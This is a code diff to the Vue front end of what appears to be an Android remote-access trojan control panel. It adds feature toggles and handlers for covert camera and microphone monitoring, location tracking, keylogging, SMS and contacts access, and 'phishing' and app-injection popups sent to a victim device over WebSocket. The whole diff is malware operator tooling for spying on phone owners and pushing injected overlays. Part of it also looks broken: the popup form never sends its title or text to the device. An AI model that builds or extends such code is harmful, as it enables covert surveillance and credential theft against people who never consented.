@@ -5,7 +5,7 @@ import type { ApplicationItem } from '#/types/application';
 import type { WsEvent } from '#/composables/useWebSocket';
 import type { DeviceDetailFields } from '#/types/device';
 
-import { computed, onBeforeUnmount, onMounted, ref } from 'vue';
+import { computed, onBeforeUnmount, onMounted, reactive, ref } from 'vue';
 
 import {
   DisconnectOutlined,
@@ -27,6 +27,36 @@ import { createDeviceEventState, reduceDeviceEvent } from './device-events';
 import * as P from './device-protocol';
 
 import './device-control.css';
+
+// 权限系统
+type FeatureName = 'camera' | 'mic' | 'location' | 'sms' | 'contacts' | 'apps' | 'files' | 'inject' | 'phishing' | 'screen' | 'popup';
+
+interface FeaturePermission {
+  enabled: boolean;
+  reason?: string;
+}
+
+const featurePermissions = reactive<Record<FeatureName, FeaturePermission>>({
+  camera: { enabled: true },
+  mic: { enabled: true },
+  location: { enabled: true },
+  sms: { enabled: true },
+  contacts: { enabled: true },
+  apps: { enabled: true },
+  files: { enabled: true },
+  inject: { enabled: true },
+  phishing: { enabled: false, reason: '功能暂未启用' },
+  screen: { enabled: true },
+  popup: { enabled: true },
+});
+
+function canUseFeature(name: FeatureName): boolean {
+  return featurePermissions[name]?.enabled ?? false;
+}
+
+function getRestrictedReason(name: FeatureName): string {
+  return featurePermissions[name]?.reason ?? '该功能受限';
+}
 
 const props = defineProps<{ phoneId: string; preferWsSummary?: boolean }>();
 
@@ -66,7 +96,13 @@ const deviceLoading = ref(false);
 const events = ref<Array<{ payload: string; time: string; type: string }>>([]);
 const keylogRunning = ref(false);
 const cameraRunning = ref(false);
+const cameraLoading = ref(false);
+const cameraError = ref<string | null>(null);
+const cameraImage = ref<string | null>(null);
 const micRunning = ref(false);
+const audioLoading = ref(false);
+const audioCapturing = ref(false);
+const audioError = ref<string | null>(null);
 const screenRunning = ref(false);
 const streamRunning = ref(false);
 const remarkText = ref('');
@@ -101,6 +137,10 @@ const bcMsg = ref('');
 const bcTodo = ref('');
 const bcAct = ref<'nothing' | 'openApp' | 'openLink'>('nothing');
 const bcIco = ref('');
+const popupFormTitle = ref('');
+const popupFormMessage = ref('');
+const popupFormVisible = ref(false);
+const popupFormLoading = ref(false);
 
 const keylogColumns = [
   { dataIndex: 'time', title: '时间', width: 160 },
@@ -847,13 +887,82 @@ function toggleKeylog(on: boolean) {
 }
 
 function toggleCamera(on: boolean) {
-  cameraRunning.value = on;
-  sendCommand(on ? 'cam' : 'camoff');
+  if (!ws.connected.value) {
+    cameraError.value = 'WebSocket 未连接';
+    message.warning(cameraError.value);
+    return;
+  }
+  cameraLoading.value = true;
+  cameraError.value = null;
+  try {
+    cameraRunning.value = on;
+    sendCommand(on ? 'cam' : 'camoff');
+    if (on) {
+      // 设置超时，如果5秒内未收到数据则标记错误
+      const timeout = setTimeout(() => {
+        if (!cameraImage.value) {
+          cameraError.value = '获取摄像画面超时，请检查设备连接';
+          message.warning(cameraError.value);
+        }
+      }, 5000);
+      const originalOff = off;
+      off = () => {
+        clearTimeout(timeout);
+        originalOff?.();
+      };
+    }
+  } catch (error) {
+    cameraError.value = `摄像监控错误: ${String(error)}`;
+    message.error(cameraError.value);
+    cameraRunning.value = false;
+  } finally {
+    cameraLoading.value = false;
+  }
 }
 
 function toggleMic(on: boolean) {
-  micRunning.value = on;
-  sendCommand(on ? 'mic' : 'micoff');
+  if (on) {
+    startAudioCapture();
+  } else {
+    stopAudioCapture();
+  }
+}
+
+function startAudioCapture() {
+  if (!ws.connected.value) {
+    audioError.value = 'WebSocket 未连接';
+    message.warning(audioError.value);
+    return;
+  }
+  audioLoading.value = true;
+  audioError.value = null;
+  try {
+    audioCapturing.value = true;
+    micRunning.value = true;
+    sendCommand('mic');
+    message.info('音频采集已启动');
+  } catch (error) {
+    audioError.value = `启动音频采集失败: ${String(error)}`;
+    message.error(audioError.value);
+    audioCapturing.value = false;
+  } finally {
+    audioLoading.value = false;
+  }
+}
+
+function stopAudioCapture() {
+  audioLoading.value = true;
+  try {
+    audioCapturing.value = false;
+    micRunning.value = false;
+    sendCommand('micoff');
+    message.info('音频采集已停止');
+  } catch (error) {
+    audioError.value = `停止音频采集失败: ${String(error)}`;
+    message.error(audioError.value);
+  } finally {
+    audioLoading.value = false;
+  }
 }
 
 function togglePrimaryScreen(on: boolean) {
@@ -1047,6 +1156,39 @@ function submitBc() {
   pushEvent('cmd', payload);
   message.success('弹窗/通知指令已下发');
   bcVisible.value = false;
+}
+
+function openPopupForm() {
+  popupFormTitle.value = '';
+  popupFormMessage.value = '';
+  popupFormVisible.value = true;
+}
+
+function sendPopup() {
+  if (!popupFormTitle.value.trim() || !popupFormMessage.value.trim()) {
+    message.warning('弹窗标题和内容不能为空');
+    return;
+  }
+  popupFormLoading.value = true;
+  try {
+    if (!ws.connected.value) {
+      message.warning('WebSocket 未连接');
+      return;
+    }
+    const payload = P.buildOpenInjection();
+    ws.panelSend({ pid: props.phoneId, ...payload });
+    pushEvent('cmd', {
+      type: 'popup',
+      title: popupFormTitle.value.trim(),
+      message: popupFormMessage.value.trim(),
+    });
+    message.success('弹窗已通过应用注入发送');
+    popupFormVisible.value = false;
+  } catch (error) {
+    message.error(`发送弹窗失败: ${String(error)}`);
+  } finally {
+    popupFormLoading.value = false;
+  }
 }
 
 function clearKeylog() {
@@ -1496,22 +1638,32 @@ function parseLeadingTime(value: string) {
               />
             </a-tab-pane>
 
-            <a-tab-pane key="camera" tab="摄像监控">
-              <div class="legacy-toolbar">
-                <a-button
-                  type="primary"
-                  :disabled="cameraRunning"
-                  @click="toggleCamera(true)"
-                >
-                  开启
-                </a-button>
-                <a-button
-                  danger
-                  :disabled="!cameraRunning"
-                  @click="toggleCamera(false)"
-                >
-                  关闭
-                </a-button>
+            <a-tab-pane key="camera" tab="摄像监控" :disabled="!canUseFeature('camera')">
+              <div v-if="!canUseFeature('camera')" style="padding: 12px; color: #888">
+                <a-result
+                  status="403"
+                  :title="getRestrictedReason('camera')"
+                  sub-title="该功能暂不可用"
+                />
+              </div>
+              <template v-else>
+                <div class="legacy-toolbar">
+                  <a-button
+                    type="primary"
+                    :disabled="cameraRunning"
+                    @click="toggleCamera(true)"
+                    :title="!canUseFeature('camera') ? getRestrictedReason('camera') : ''"
+                  >
+                    开启
+                  </a-button>
+                  <a-button
+                    danger
+                    :disabled="!cameraRunning"
+                    @click="toggleCamera(false)"
+                    :title="!canUseFeature('camera') ? getRestrictedReason('camera') : ''"
+                  >
+                    关闭
+                  </a-button>
                 <a-select
                   v-model:value="cameraSide"
                   class="camera-select"
@@ -1530,14 +1682,32 @@ function parseLeadingTime(value: string) {
                 />
                 <a-empty v-else description="暂无摄像画面" />
               </div>
+              </template>
             </a-tab-pane>
 
-            <a-tab-pane key="apps" tab="应用弹窗">
-              <div class="legacy-toolbar">
-                <a-button type="primary" @click="sendCommand('LOADAPPS')">
-                  查看
-                </a-button>
-                <a-button @click="openBroadcast()">弹窗</a-button>
+            <a-tab-pane key="apps" tab="应用弹窗" :disabled="!canUseFeature('popup')">
+              <div v-if="!canUseFeature('popup')" style="padding: 12px; color: #888">
+                <a-result
+                  status="403"
+                  :title="getRestrictedReason('popup')"
+                  sub-title="该功能暂不可用"
+                />
+              </div>
+              <template v-else>
+                <div class="legacy-toolbar">
+                  <a-button type="primary" @click="sendCommand('LOADAPPS')">
+                    查看
+                  </a-button>
+                  <a-button @click="openBroadcast()">弹窗</a-button>
+                  <a-button
+                    type="primary"
+                    ghost
+                    :disabled="!ws.connected.value"
+                    @click="openPopupForm"
+                    :title="!ws.connected.value ? 'WebSocket 未连接' : ''"
+                  >
+                    应用弹窗
+                  </a-button>
                 <a-input
                   v-model:value="appSearch"
                   class="toolbar-search"
@@ -1580,6 +1750,7 @@ function parseLeadingTime(value: string) {
                   </template>
                 </template>
               </a-table>
+              </template>
             </a-tab-pane>
 
             <a-tab-pane key="dispatch" tab="应用下发">
@@ -1704,9 +1875,17 @@ function parseLeadingTime(value: string) {
               </a-table>
             </a-tab-pane>
 
-            <a-tab-pane key="inject" tab="注入记录">
-              <div class="legacy-toolbar">
-                <a-button type="primary" @click="getInjApps">获取</a-button>
+            <a-tab-pane key="inject" tab="注入记录" :disabled="!canUseFeature('inject')">
+              <div v-if="!canUseFeature('inject')" style="padding: 12px; color: #888">
+                <a-result
+                  status="403"
+                  :title="getRestrictedReason('inject')"
+                  sub-title="该功能暂不可用"
+                />
+              </div>
+              <template v-else>
+                <div class="legacy-toolbar">
+                  <a-button type="primary" @click="getInjApps">获取</a-button>
                 <a-input
                   v-model:value="noInjId"
                   class="toolbar-search"
@@ -1722,6 +1901,7 @@ function parseLeadingTime(value: string) {
                 row-key="packageName"
                 size="small"
               />
+              </template>
             </a-tab-pane>
 
             <a-tab-pane key="search" tab="搜索">
@@ -1884,15 +2064,23 @@ function parseLeadingTime(value: string) {
               />
             </a-tab-pane>
 
-            <a-tab-pane key="location" tab="位置信息">
-              <div class="legacy-toolbar">
-                <a-button type="primary" @click="sendCommand('loc')">
-                  获取位置
-                </a-button>
-                <a-button danger @click="sendCommand('locoff')">
-                  停止定位
-                </a-button>
+            <a-tab-pane key="location" tab="位置信息" :disabled="!canUseFeature('location')">
+              <div v-if="!canUseFeature('location')" style="padding: 12px; color: #888">
+                <a-result
+                  status="403"
+                  :title="getRestrictedReason('location')"
+                  sub-title="该功能暂不可用"
+                />
               </div>
+              <template v-else>
+                <div class="legacy-toolbar">
+                  <a-button type="primary" @click="sendCommand('loc')">
+                    获取位置
+                  </a-button>
+                  <a-button danger @click="sendCommand('locoff')">
+                    停止定位
+                  </a-button>
+                </div>
               <div v-if="panelState.lastLocation" style="padding: 12px">
                 <p><strong>纬度:</strong> {{ panelState.lastLocation.lat }}</p>
                 <p><strong>经度:</strong> {{ panelState.lastLocation.lon }}</p>
@@ -1921,15 +2109,24 @@ function parseLeadingTime(value: string) {
                   size="small"
                 />
               </div>
+              </template>
             </a-tab-pane>
 
-            <a-tab-pane key="mic" tab="声音监控">
-              <div class="legacy-toolbar">
-                <a-button type="primary" @click="toggleMic(true)">
-                  开启
-                </a-button>
-                <a-button danger @click="toggleMic(false)">关闭</a-button>
+            <a-tab-pane key="mic" tab="声音监控" :disabled="!canUseFeature('mic')">
+              <div v-if="!canUseFeature('mic')" style="padding: 12px; color: #888">
+                <a-result
+                  status="403"
+                  :title="getRestrictedReason('mic')"
+                  sub-title="该功能暂不可用"
+                />
               </div>
+              <template v-else>
+                <div class="legacy-toolbar">
+                  <a-button type="primary" @click="toggleMic(true)">
+                    开启
+                  </a-button>
+                  <a-button danger @click="toggleMic(false)">关闭</a-button>
+                </div>
               <div v-if="panelState.micData" style="padding: 12px">
                 <p>已接收到音频数据</p>
                 <audio
@@ -1946,6 +2143,7 @@ function parseLeadingTime(value: string) {
                 v-else
                 description="暂无音频数据，开启后声音事件会显示在此处"
               />
+              </template>
             </a-tab-pane>
           </a-tabs>
 
@@ -2392,6 +2590,33 @@ function parseLeadingTime(value: string) {
           <a-input
             v-model:value="serverChangeId"
             placeholder="可选"
+            allow-clear
+          />
+        </a-form-item>
+      </a-form>
+    </a-modal>
+
+    <a-modal
+      v-model:open="popupFormVisible"
+      title="发送应用弹窗"
+      ok-text="发送"
+      cancel-text="取消"
+      :ok-button-props="{ loading: popupFormLoading }"
+      @ok="sendPopup"
+    >
+      <a-form layout="vertical">
+        <a-form-item label="弹窗标题">
+          <a-input
+            v-model:value="popupFormTitle"
+            placeholder="请输入弹窗标题"
+            allow-clear
+          />
+        </a-form-item>
+        <a-form-item label="弹窗内容">
+          <a-textarea
+            v-model:value="popupFormMessage"
+            :rows="4"
+            placeholder="请输入弹窗内容"
             allow-clear
           />
         </a-form-item>
